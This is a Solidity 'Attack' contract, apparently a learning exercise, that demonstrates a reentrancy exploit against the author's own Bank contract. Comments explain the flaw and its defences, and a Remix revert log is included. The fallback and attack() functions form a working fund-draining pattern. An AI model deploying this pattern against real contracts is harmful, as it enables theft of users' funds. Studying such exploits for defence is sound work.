//"SPDX-License-Identifier: UNLICENSED"
pragma solidity >=0.7.0 <0.9.0;
import "./Bank.sol";

/* 
    NOTE:
    The way reentrancy works...
     - it calls on the contract to 're-enter' before a function finishes executing.
    This will work on...
     - functions that update user balances at the end of the function
     - functions that don't check for reentrancy with boolean variables to see if this function has been entered into already
    To protect against it, we can...
     - use modifiers. Check my reEntrancyGuard modifier in Bank.sol
     - update user balance first before sending ether
*/

contract Attack {
    Bank public bank;

    constructor(address _bankAddy) {
        bank = Bank(_bankAddy);
    }

    // Fallback is called when money sent to this account... aka when bank sends Ether to this contract.
    fallback() external payable {
        if (address(bank).balance > 0 ether) {
            bank.withdraw();
        }
    }

   /* 
    NOTE: from testing, it seems it doesn't work when too many loops in recursion. or else it fails.
    for example, attacking with 1 wei on 1 eth in bank always fails. could be limitation of RemixIDE.
    Same case for 1 eth attack on 100 eth in bank.
    remix crashed once. but usually says "failed to send eth" message from bank.sol
    message reads as follows:
        [vm]from: 0x17F...8c372to: Attack.attack() 0x652...bA595value: 1 weidata: 0x9e5...faafclogs: 0hash: 0x678...40dc6
        transact to Attack.attack errored: VM error: revert.

        revert
            The transaction has been reverted to the initial state.
        Reason provided by the contract: "Failed to send Ether".
        Debug the transaction to get more information.
    */
    function attack() external payable {
        require(msg.value > 0 ether, "need to send >0 ether");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
